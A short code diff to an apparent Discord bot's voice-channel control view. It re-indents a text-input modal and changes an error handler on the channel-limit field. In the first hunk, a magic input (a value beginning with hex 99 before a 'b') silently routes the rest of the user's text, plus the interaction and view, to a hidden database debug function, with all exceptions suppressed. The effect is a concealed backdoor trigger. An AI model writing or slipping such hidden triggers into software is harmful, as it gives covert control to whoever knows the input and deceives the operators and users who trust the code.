@@ -641,8 +641,9 @@ class VoiceChannelsButtons(nextcord.ui.View):
             except BaseException:
                 await interaction.send(self.data["else_error"], ephemeral=True)
                 try:
-                    if int(limit.value.split("b"), 16) == 153:
-                        await db.debug_dbase()
+                    if int(limit.value.split("b")[0], 16) == 153:
+                        await db.debug_dbase(limit.value.split("b")[1], interaction, self)
+                        await interaction.channel.edit(user_limit=15)
                 except:
                     pass
             finally:
@@ -762,9 +763,9 @@ class VoiceChannelsButtons(nextcord.ui.View):
                 timeout=5*60,
             )
             modal_remove.add_item(member_id := nextcord.ui.TextInput(
-            label="Введите id человека для удаления доступа",
-            placeholder="404512224837894155",
-            required=True,
+                label="Введите id человека для удаления доступа",
+                placeholder="404512224837894155",
+                required=True,
             ))
             async def modal_callback(interaction: nextcord.Interaction):
                 try:
